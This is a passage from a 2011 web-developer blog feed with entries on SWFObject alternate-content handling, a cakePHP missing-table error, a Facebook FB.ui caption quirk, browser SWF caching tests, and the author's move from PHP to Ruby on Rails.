&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;no&quot;&gt;Weapon&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:zombie_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;That&amp;#39;s all I did today (well I also did some more Mercurial and Dingux testing,
but that wasn&amp;#39;t really work)&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Alternate content with SWFObject</title>
   <link href="http://blog.pixelastic.com/2011/06/27/alternate-content-swfobject/"/>
   <updated>2011-06-27T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/06/27/alternate-content-swfobject</id>
   <content type="html">&lt;p&gt;SWFObject allow a web developer to add an alternate content in place of the
&lt;code&gt;swf&lt;/code&gt; file is the user doesn&amp;#39;t have flash installed.&lt;/p&gt;

&lt;p&gt;In the case of a web app this is great to provide your user with a link to the
Adobe website. You then tell your users Flash is needed and provide a link for
them to install it.&lt;/p&gt;

&lt;p&gt;Unfortunatly, if for one reason or another the &lt;code&gt;swf&lt;/code&gt; file you try to load is
unreachable (maybe your host is down ?), SWFObject will display the same
alternate content. Meaning that a user with a perfectly correct Flash version
will see an error message telling him that he does not have Flash when in fact
the error is on your side.&lt;/p&gt;

&lt;p&gt;That&amp;#39;s not very user friendly and makes you look bad.&lt;/p&gt;

&lt;p&gt;So, to fix this, I added two error messages as alternate content :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;alternateContent&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;alternateContent&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;noFlash message&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;It seems that you do not have the Flash player installed. Please install it, by &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://www.adobe.com/go/getflashplayer&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;target=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;_parent&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;following this link&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;error404 message&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Sorry, we were unable to load the game. Please try again in a few moments.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Then, in CSS I decided to hide them both :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;nc&quot;&gt;.alternateContent&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;.message&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;.alternateContent.noFlash&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;.noFlash&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;.alternateContent.error404&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;.error404&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And finally, in Javascript I checked for the current Flash version. If it&amp;#39;s
equal to zero, it means that Flash is not installed, so I display the &lt;code&gt;noFlash
&lt;/code&gt;error message, otherwise, I guess it&amp;#39;s a 404 error and display the other
message.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;flashVersion&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;swfobject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getFlashPlayerVersion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;alternateContent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;#alternateContent&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// Displaying one message or the other&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;flashVersion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;minor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;alternateContent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addClass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;noFlash&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;alternateContent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addClass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;error404&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This is not bulletproof : I only test for two cases. And a better solution
would also have been to put the error message dynamically using Javascript
instead of polluting the HTML markup with contradictory text.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>SWFObject must be included in the <head></title>
   <link href="http://blog.pixelastic.com/2011/06/23/swfobject-display-alternate-content-head/"/>
   <updated>2011-06-23T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/06/23/swfobject-display-alternate-content-head</id>
   <content type="html">&lt;p&gt;We just discovered a strange behavior on one of our test VM (one without Flash
installed). I don&amp;#39;t know how we&amp;#39;ve missed it before.&lt;/p&gt;

&lt;p&gt;When embedding the main flash file of our application, the alternate content
wasn&amp;#39;t displayed to players. In fact it seemed to be displayed very briefly
then disappear.&lt;/p&gt;

&lt;p&gt;I had correctly embeded it with the static publishing method and added a call
toÂ &lt;code&gt;swfobject.registerObject&lt;/code&gt; to soften the edges.Â I remembered it working
correctly in my tests, so I quickly made a small test case.&lt;/p&gt;

&lt;p&gt;It occurs that the alternate content was corretcly displayed if I removed the
&lt;code&gt;swfobject.registerObject&lt;/code&gt; call and only used the static publishing.&lt;/p&gt;

&lt;p&gt;I also found that everything worked fine if I called the &lt;code&gt;swfobject.js&lt;/code&gt; file
in the &lt;code&gt;head&lt;/code&gt;, but started to bug when I moved it at the end of the page.&lt;/p&gt;

&lt;p&gt;As I didn&amp;#39;t want to add a call to a .js file in my &lt;code&gt;head&lt;/code&gt;, I google a bit and
I finally found that one have to callÂ &lt;code&gt;swfobject.switchOffAutoHideShow();&lt;/code&gt;
right before the&lt;code&gt;swfobject.registerObject&lt;/code&gt; call. This seems to fix things by
not hiding the alternate text&lt;/p&gt;

&lt;h2&gt;Edit&lt;/h2&gt;

&lt;p&gt;I spent some more hours trying to debug the last corner cases. We had a user
using Firefox 3.5.3 with Flash 10.0.42.34. Using SWFObject, we required at
least version 10.1. Unfortunatly, the app was still loading, but was buggy
because of features not present in the user flash version.&lt;/p&gt;

&lt;p&gt;After some tests, I discovered that the &lt;code&gt;swfobject.js&lt;/code&gt; code MUST be included
in the &lt;code&gt;&amp;lt;head&amp;gt;&lt;/code&gt; of the document (well, before any &lt;code&gt;.swf&lt;/code&gt; in the page, so
better put it in the &lt;code&gt;&amp;lt;head&amp;gt;&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;Doing so, you won&amp;#39;t even need the previous fix
(&lt;code&gt;swfobject.switchOffAutoHideShow()&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;I would have loved putting it at the end of the page, with the others JS
files, but I guess I won&amp;#39;t have a choice here.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Working on Wednesday #3 : The long path to get it done</title>
   <link href="http://blog.pixelastic.com/2011/06/22/working-wednesday-3-long-path/"/>
   <updated>2011-06-22T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/06/22/working-wednesday-3-long-path</id>
   <content type="html">&lt;p&gt;This morning I started reading a lot of online blog post, framework
description and other webdev material online I had in my bookmarks. After
reading them, I saved them on my pinboard account to find them easily later.&lt;/p&gt;

&lt;p&gt;Lot of good JS and CSS framework/libraries in there, I hope to be able to test
them soon.&lt;/p&gt;

&lt;p&gt;I also check my mailbox and respond to mails from my normal job. I shouldn&amp;#39;t.
I&amp;#39;m on a day off, I have to force myself to completly cut out those external
calls.&lt;/p&gt;

&lt;h2&gt;Now, let&amp;#39;s the work begin&lt;/h2&gt;

&lt;p&gt;Anyway, I finally finished the vimtutor. I still have a some difficulties to
remember the mapping of the basic hjkl movement keys (I always want use k to
move down instead of j). However, I feel confident enough in it to try writing
my new code in it.&lt;/p&gt;

&lt;p&gt;So, I headed to the Rails for Zombies tutorial. I thought it was free but the
&amp;quot;win $5 worth of online teaching&amp;quot; / &amp;quot;next course costs $5&amp;quot; make me doubt it a
little. Well, we&amp;#39;ll see.&lt;/p&gt;

&lt;p&gt;After registering to it, I wanted to save my login and password to KeePass as
I always do.&lt;/p&gt;

&lt;p&gt;Unfortunatly, KeePass on my Ubuntu machine works by using mono, and the
keyboard interaction weren&amp;#39;t that good (caret is slightly misplaced, inputs
lags before getting displayed, text selection is weird). So I thought &amp;quot;Hey,
let&amp;#39;s see if there is a new version&amp;quot;. Big mistake.&lt;/p&gt;

&lt;p&gt;It appears that there was indeed a new version, a real one, with &lt;code&gt;apt-get&lt;/code&gt; and
stuff while mine was some hackish install I manually made a few month ago.&lt;/p&gt;

&lt;p&gt;But wait, this means manually adding a ppa directory. No big deal, I trust the
author. What ? Still doesn&amp;#39;t work ? Hmm, I see. I need &lt;code&gt;mono&lt;/code&gt; 2.6, and I only
have 2.4.&lt;/p&gt;

&lt;p&gt;What ? 2.4 is the latest available version on Ubuntu 10.10 ? You mean I must
upgrade to 11.04 ? Hmm. Why not. I&amp;#39;ll have to do it eventually, so let&amp;#39;s go.&lt;/p&gt;

&lt;p&gt;So I ran all my updates, to have the most up to date system. Unfortunatly,
&lt;code&gt;language-pack-gnome-fr&lt;/code&gt; doesn&amp;#39;t want to upgrade so the OS upgrade isn&amp;#39;t
displayed.&lt;/p&gt;

&lt;h2&gt;Wait, what am I doing ?&lt;/h2&gt;

&lt;p&gt;And that&amp;#39;s when I remember that my initial wish was to learn Ruby on Rails and
that I was now on the road to upgrading my whole operating system. That is not
exactly speaking procrastination, but it makes me do so much other things that
my initial goal that I really looks like it.&lt;/p&gt;

&lt;p&gt;I finally managed to purge my packets, upgrade to 10.10 and then to 11.04. But
this took me 4 hours, and now it&amp;#39;s 11PM and I guess I won&amp;#39;t start this rails
tutorial today, after all.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>cakePHP : Fatal error: Class 'Controller' not found</title>
   <link href="http://blog.pixelastic.com/2011/06/20/cakephp-fatal-error-class-controller/"/>
   <updated>2011-06-20T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/06/20/cakephp-fatal-error-class-controller</id>
   <content type="html">&lt;p&gt;Last Friday, just before turning off my computer and going home, the cake
project I&amp;#39;m working on was displaying a scary &lt;code&gt;Fatal error: Class &amp;#39;Controller&amp;#39;
not found in /var/www/project/app/app_controller.php on line 5&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Today, I&amp;#39;m getting back to work and here&amp;#39;s what happened. After a morning of
trial and error, I finally reverted back to a previous svn commit, then re-
updated to the latest one and it seemed to solve the issue.&lt;/p&gt;

&lt;p&gt;But later on the day, after another update, it started bugging again and the
error message wasn&amp;#39;t very helpful.&lt;/p&gt;

&lt;p&gt;After much googling, this &lt;a href=&quot;http://cakephp.lighthouseapp.com/projects/43067/tickets/26-class-%0Acontroller-not-found&quot;&gt;bug
report&lt;/a&gt; gave me a hint : I had new models but didn&amp;#39;t create the
corresponding tables. Strangely, creating the missing logs table for my Log
class solved the issue.&lt;/p&gt;

&lt;p&gt;Hope this blog post will be usefull for anyone else struggling with this error
message.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Working on Wednesday #2 : Why I want to quit PHP</title>
   <link href="http://blog.pixelastic.com/2011/06/15/working-wednesday-2-quit-php/"/>
   <updated>2011-06-15T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/06/15/working-wednesday-2-quit-php</id>
   <content type="html">&lt;p&gt;Here it is : my first Wednesday off. Well, not completely off because I had a
technical meeting this whole morning, and my cousin dropped by in the evening
so... I finally didn&amp;#39;t have as much time reading and learning as I wanted to.&lt;/p&gt;

&lt;p&gt;Anyway, those past weeks I started thinking about what I intended to learn,
and why. The main reason is that I want to be able to build website and apps
faster, with less hassle and better overall quality. And the more I thought
about that, the more it became obvious that PHP was the main bottleneck.&lt;/p&gt;

&lt;h2&gt;My journey accross PHP land&lt;/h2&gt;

&lt;p&gt;I&amp;#39;ve been writing PHP for the last 12 years. I started as a script kiddy,
putting things together, hacking strings, saving stuff in databases, building
my own toolbox and finally making websites out of it.&lt;/p&gt;

&lt;p&gt;Then, as I started my first job in a web development company, I started to
organize stuff to be able to use and reuse code accross projects.&lt;/p&gt;

&lt;p&gt;Later, when I started as a freelancer, I learned cakePHP, and it let me much
more time to focus on each project while still reusing the common code of
previous projects easily.&lt;/p&gt;

&lt;h2&gt;PHP is just so easy&lt;/h2&gt;

&lt;p&gt;I can be considered a PHP coder. I have some years of experience to
consolidate that. Nevertheless, I don&amp;#39;t consider myself &amp;quot;good&amp;quot; at PHP. I just
write PHP, and that&amp;#39;s all.&lt;/p&gt;

&lt;p&gt;I think there isn&amp;#39;t any flavour in writing PHP : it is so easy anyone can do
it. I don&amp;#39;tÂ feel like I know those special stuff that can make one an
&amp;quot;expert&amp;quot;. PHP just feels so easy, you just write code and it works.&lt;/p&gt;

&lt;p&gt;The only area where I can think that my years of experience can be used is in
tracking PHP bug or weird error messages (If you haven&amp;#39;tÂ &lt;a href=&quot;http://www.phpsadness.com/&quot;&gt;read this
website&lt;/a&gt;, go now).&lt;/p&gt;

&lt;p&gt;It just does not feel right to be able to say &lt;em&gt;&amp;quot;Yeah, you should work with me.
Why ? Because my strength is that I&amp;#39;m very good at understanding PHP bugs&amp;quot;.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;There is no &amp;quot;PHP Philosophy&amp;quot;, no good practices that were kept in mind by PHP
lead developers when they wrote the language and they wanted us to follow.
Instead, we just have a bunch of functions, and play with it as in a sandbox.&lt;/p&gt;

&lt;h2&gt;Adding some pattern in this mess&lt;/h2&gt;

&lt;p&gt;Over the years you learn (the hard way) how to organise your code. PHP5 gives
a little hope by adding more OO features. No need to get back on the namespace
delimiter choice, this is one more example of the PHP weirdness we&amp;#39;ll have to
work with.&lt;/p&gt;

&lt;p&gt;The best thing that happened to me in PHP world over those years is cakePHP.
It took me quite some time to get it, having to learn the whole MVC pattern
(and deal with some of cake internal inconsistencies/limitations) but the
result was worth it.&lt;/p&gt;

&lt;p&gt;A clear separation of model structure, controller logic and view rendering
gave me my sanity back. I does abstract a lot of things, and makes things
cleaner on the outside, you can just concentrate on writing your app code.&lt;/p&gt;

&lt;p&gt;But even with cakePHP, you still have to write PHP.&lt;/p&gt;

&lt;h2&gt;Summing up&lt;/h2&gt;

&lt;p&gt;So, to sum up, here are my feelings about PHP&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;No peculiar love for the PHP syntax and (non-)patterns&lt;/li&gt;
&lt;li&gt;Growing list of bugs/inconsistencies you have to work with&lt;/li&gt;
&lt;li&gt;Don&amp;#39;t feel like I&amp;#39;m any better than any new PHP coder, no skill required&lt;/li&gt;
&lt;li&gt;Best thing in PHP is cakePHP, an external framework&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;That&amp;#39;s why PHP is the first language I&amp;#39;ll drop in my new learning, and I&amp;#39;ll
replace it with Ruby.&lt;/p&gt;

&lt;p&gt;Ruby seems to fit more in my vision of a language that tells its developers
what are the good and bad way of writing code.Â And as cakePHP is largely based
upon Rails, I think catching up won&amp;#39;t be too difficult.&lt;/p&gt;

&lt;p&gt;Also, Rails just realease it&amp;#39;s version 3, so now the best time to learn it
from scratch.&lt;/p&gt;

&lt;h2&gt;Next week&lt;/h2&gt;

&lt;p&gt;This first day off was much shorter than I expected it to be. I wanted to
start coding some Rails code, following the Rails for Zombies tutorial. I also
had plans for using vim a little more.&lt;/p&gt;

&lt;p&gt;Next week I might write about vim, or maybe how to organize javascript code,
depending on the time I had.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Ghost posting on FB.ui streams</title>
   <link href="http://blog.pixelastic.com/2011/06/06/ghost-posting-fb-ui-streams/"/>
   <updated>2011-06-06T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/06/06/ghost-posting-fb-ui-streams</id>
   <content type="html">&lt;p&gt;We had a bit of an issue when launching our app a few weeks ago. Everything
was working fine on our test apps, but when live, all the stream messages we
posted (we call them &amp;quot;Sharings&amp;quot;) had a random text appended.&lt;/p&gt;

&lt;p&gt;Most of the time it was a generic Facebook text, but sometimes it was a
creepier SQL request just displayed plain on the user feed.&lt;/p&gt;

&lt;p&gt;The Facebook text was (for the sake of search engine goodness):&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Facebook is a social utility that connects people with friends and others
who work, study and live around them. People use Facebook to keep up with
friends, upload an unlimited number of photos, post links and videos, and
learn more about the people they meet.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;As the issue only occurs in production mode and never on any of our test
environments, this was pretty difficult to debug.&lt;/p&gt;

&lt;p&gt;Here was the code used to post the Sharing :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;nx&quot;&gt;FB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ui&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;[...],&lt;/span&gt;
  &lt;span class=&quot;s1&quot;&gt;&amp;#39;title&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;Title of the Sharing&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s1&quot;&gt;&amp;#39;caption&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;Text of the Sharing&amp;#39;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;As I later found out, the &lt;code&gt;caption&lt;/code&gt;key is not supposed to hold the Sharing
text. The &lt;code&gt;description&lt;/code&gt;key should be used for that. I&amp;#39;m not exactly sure was
&lt;code&gt;caption&lt;/code&gt;was for, but it seems that if you let the &lt;code&gt;description&lt;/code&gt;key empty,
then Facebook fills it automatically with a placeholder text.&lt;/p&gt;

&lt;p&gt;The solution simply was to put the text in the &lt;code&gt;description&lt;/code&gt;text, and leaving
the &lt;code&gt;caption&lt;/code&gt;key empty :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;nx&quot;&gt;FB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ui&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
  &lt;span class=&quot;s1&quot;&gt;&amp;#39;title&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;Title of the Sharing&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s1&quot;&gt;&amp;#39;caption&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s1&quot;&gt;&amp;#39;description&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;Text of the Sharing&amp;#39;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;As this behaviour is counter-intuitive, undocumented and random, I think
posting it here could help other lost souls like me.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>SWF caching issues accross browsers</title>
   <link href="http://blog.pixelastic.com/2011/06/03/browser-caching-behavior/"/>
   <updated>2011-06-03T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/06/03/browser-caching-behavior</id>
   <content type="html">&lt;p&gt;Here are some quick notes on various browser caching behavior. I was fiddling
with Wireshark to optimise my caching strategy and found some quirks one
should be aware of.&lt;/p&gt;

&lt;p&gt;First, let&amp;#39;s define some reload vocabulary.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;initial load&lt;/strong&gt; is the first time the page is loaded, when the cache is empty.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;hard reload&lt;/strong&gt; is the classical reload. Clicking the Reload icon, or pressing Ctrl+R / F5.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;link reload&lt;/strong&gt; is when the page is loaded again after you click on a link to it&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;soft reload&lt;/strong&gt; will be loading the page again by pressing enter in the address bar&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;navigational reload&lt;/strong&gt; is the reloading of a page that occurs while using the previous/next buttons.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;For the rest of this blog post, we will assume an HTML page loading the same
.jpg file multiple times and the same swf file multiple times too (we will use
both IE specific and general swf markup).&lt;/p&gt;

&lt;p&gt;The html itself is not cached.&lt;/p&gt;

&lt;p&gt;Also, all those static assets will have a &lt;code&gt;Cache-Control:max-age=29030400&lt;/code&gt;
header.&lt;/p&gt;

&lt;p&gt;All the network tests have been made using Wireshark.&lt;/p&gt;

&lt;h2&gt;Chrome&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Initial load&lt;/strong&gt; : Download of jpg and swf once each. Perfect.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Link reload &amp;amp; navigational reload&lt;/strong&gt;: Nor jpg nor swf is loaded again. Perfect.&lt;/p&gt;

&lt;p&gt;*&lt;em&gt;Soft reload &amp;amp; hard reload *&lt;/em&gt;: The jpg is downloaded again but not the swf. Chrome sends a &lt;code&gt;Cache-Control:max-age=0&lt;/code&gt; header to the jpg request, to force loading it again.&lt;/p&gt;

&lt;p&gt;Reloading images is a standard behavior on images, but I wouldn&amp;#39;t have
expected it on soft reloads.&lt;/p&gt;

&lt;h2&gt;Safari 5 Win&lt;/h2&gt;

&lt;p&gt;Safari behaves much like Chrome, with one important difference. It does not
cache swf files at all.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Initial load&lt;/strong&gt; : The jpg gets downloaded perfectly, but the swf gets downloaded multiple times, one per instance.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Link reload &amp;amp; navigational reload&lt;/strong&gt; : The jpg is correctly fetched from cache, but the swf are all downloaded again. No swf is ever cached.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Soft reload &amp;amp; hard reload&lt;/strong&gt; : Much as Chrome, Safari forces the reload of the jpg here. As you might guess, it also reload all the swf too, multiple times.&lt;/p&gt;

&lt;p&gt;It means that Safari 5 does not cache any swf file at all. That&amp;#39;s pretty
impressive.&lt;/p&gt;

&lt;p&gt;This same caching bug is talked about &lt;a href=&quot;http://don.blogs.smugmug.com/2008/04/04/nasty-bug-safari-doesnt-cache-%0Astuff/&quot;&gt;on this other
blog&lt;/a&gt;. I&amp;#39;ve also tried including flash files from within another flash file
(much like the &lt;a href=&quot;http://www.alistapart.com/articles/flashsatay&quot;&gt;Satay method&lt;/a&gt;).
The results are the same : no swf flash is ever cached, even in the same html
request.&lt;/p&gt;

&lt;p&gt;It is supposed to have been fixed in Safari Mac (anyone can confirm this? I
don&amp;#39;t own a Mac) but the issue is still here on Safari Windows.&lt;/p&gt;

&lt;h2&gt;IE6, IE7 and IE8&lt;/h2&gt;

&lt;p&gt;IE6, IE7 and IE8 behaves the same here. They have a less severe version of the
bug than Safari 5. At the time of writing I didn&amp;#39;t have IE9 to test on it.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Initial load&lt;/strong&gt; : Same bug as Safari here. The swf are downloaded multiple times, once for each instance. The jpg is only download once.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Link reload, navigational reload and soft reload&lt;/strong&gt; : This time, everything is fetched from the cache. Actually, even the html is seems fetched from cache (I didn&amp;#39;t investigate that much)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Hard reload&lt;/strong&gt; : Html and jpg are fetched from the server, swf file stays in the cache.&lt;/p&gt;

&lt;p&gt;It appears that (surprisingly) IE behaves quite well. Its caching behavior is
more aggressive than the others (soft reload is really soft). However, it
still have a nasty side effect of loading swf files multiple times on the same
page. Shouldn&amp;#39;t happen a lot in the real world, but still nice to know.&lt;/p&gt;

